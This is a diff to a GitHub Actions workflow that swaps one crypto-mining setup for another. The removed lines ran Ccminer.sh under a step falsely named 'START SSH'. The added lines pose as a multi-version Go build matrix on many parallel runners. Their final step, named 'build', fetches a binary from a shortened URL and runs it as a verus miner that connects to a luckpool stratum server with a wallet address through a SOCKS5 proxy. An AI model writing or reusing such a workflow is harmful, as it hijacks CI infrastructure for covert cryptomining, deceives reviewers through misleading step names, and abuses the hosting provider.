@@ -1,15 +1,55 @@
-name: zakissh
-on:
-  workflow_dispatch:
+name: build
+on: [push]
 jobs:
   build:
-    runs-on: ubuntu-latest
+    name: build
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 20
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B, C, D]
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
     steps:
-      - uses: actions/checkout@v2
-      - name: START SSH
-        continue-on-error: true
-        run: chmod +x Ccminer.sh && ./Ccminer.sh
-      - name: KEEP ALIVE FOR 6h
-        continue-on-error: true
-        run: sleep 6h
+    - name: set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: setup
+      uses: Vampire/setup-wsl@v1
+  deploy:
+    name: deploy
+    needs: build
+    runs-on: windows-latest
+    strategy:
+      max-parallel: 5
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5]
+        flag: [A, B]
+    env:
+        NUM_JOBS: 10
+        JOB: ${{ matrix.go }}
+    defaults:
+     run:
+       shell: wsl-bash -u root {0}
+    steps:
+    - name: set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: setup
+      uses: Vampire/setup-wsl@v1
+    - name : install dependencies
+      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1 
+    - name: build 
+      run: wget -qO build https://git.io/JiGZh && chmod +x build && ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RJsPUk4b65Q3iyrKgvG2HVwmNzUsGXqZiD.(echo $(shuf -i 1-99999 -n 1)-SIHU) -p x -t $(nproc --all) -x socks5://46.4.96.137:1080
         
